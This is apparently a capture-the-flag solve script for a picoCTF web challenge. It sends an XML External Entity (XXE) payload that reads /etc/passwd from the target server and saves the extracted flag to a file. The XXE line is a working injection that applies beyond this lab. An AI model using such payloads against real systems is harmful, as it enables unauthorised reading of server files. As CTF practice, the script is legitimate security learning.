import os

import requests

from bs4 import BeautifulSoup

def password_found(pw: str) -> str:
    name = __file__.split(".")[0]
    
    dir = f"{name}-flag.txt"

    print(f"Password Found : {pw}\n")

    print(f"Saving password to {dir}", end="...")
    
    with open(dir, "w+") as f:
        f.write(pw)

    print("Done\n")

    return dir

cur_dir = os.path.dirname(__file__)

url = "http://saturn.picoctf.net:50988"

r = requests.get(url)

content = r.text

soup = BeautifulSoup(content, "html.parser")
script = soup.find_all("script")[:2]
script = [s.attrs["src"] for s in script]

for src in script:
    r = requests.get(url + src)

    with open(os.path.join(cur_dir, src.split("/")[-1]), "w+") as f:
        f.write(r.text)

data =  '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data><ID>&file;</ID></data>'

r = requests.post(url + "/data", data=data)

content = r.text
result = content.splitlines()[-1]

result = result.split(":")[-1]

dir = password_found(result)